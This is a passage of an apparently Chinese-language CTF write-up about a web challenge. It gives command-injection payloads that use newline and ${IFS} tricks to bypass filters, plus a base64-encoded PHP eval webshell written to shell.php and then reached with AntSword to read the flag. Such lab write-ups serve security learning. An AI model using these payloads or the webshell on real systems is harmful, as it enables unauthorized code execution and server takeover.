<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?ip=%0als</span><br></pre></td></tr></table></figure>

<p><img src="/2022/04/15/%E7%AB%9E%E8%B5%9B%E8%AF%BE-WEB5/1.png" alt="img"></p>
<p>好！什么也没看出来<br>考虑上马，这里选择用base64对一句话木马进行加密<br>原型</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php @<span class="built_in">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;attack&#x27;</span>]);?&gt;</span><br></pre></td></tr></table></figure>

<p>base64后</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">PD9waHAgQGV2YWwoJF9QT1NUWydhdHRhY2snXSk7Pz4=</span><br></pre></td></tr></table></figure>

<p>因为它ban了很多重要的符号，我们就先将base64后的放到txt文件中</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?ip=%0aecho<span class="variable">$&#123;IFS&#125;</span><span class="string">&quot;PD9waHAgQGV2YWwoJF9QT1NUWydhdHRhY2snXSk7Pz4=&quot;</span>&gt;base64.txt</span><br></pre></td></tr></table></figure>

<p>访问base64.txt</p>
<p><img src="/2022/04/15/%E7%AB%9E%E8%B5%9B%E8%AF%BE-WEB5/2.png" alt="img"></p>
<p>OK, 下面就把它解密放到php文件中，这里我用拼接的方法绕过php过滤</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?ip=%0aa=p%0ab=hp%0abase64<span class="variable">$&#123;IFS&#125;</span>-d<span class="variable">$&#123;IFS&#125;</span>base64.txt&gt;shell.$a<span class="variable">$b</span></span><br></pre></td></tr></table></figure>

<p>用蚁剑进行连接</p>
<p><img src="/2022/04/15/%E7%AB%9E%E8%B5%9B%E8%AF%BE-WEB5/3.png" alt="img"></p>
<p>成功连接后访问根目录</p>
<p><img src="/2022/04/15/%E7%AB%9E%E8%B5%9B%E8%AF%BE-WEB5/4.png" alt="img"></p>
<p>获得flag</p>
]]></content>
      <categories>
        <category>实践</category>
      </categories>
      <tags>
        <tag>绕过</tag>
        <tag>CTF</tag>
        <tag>WEB</tag>
      </tags>
  </entry>
</search>
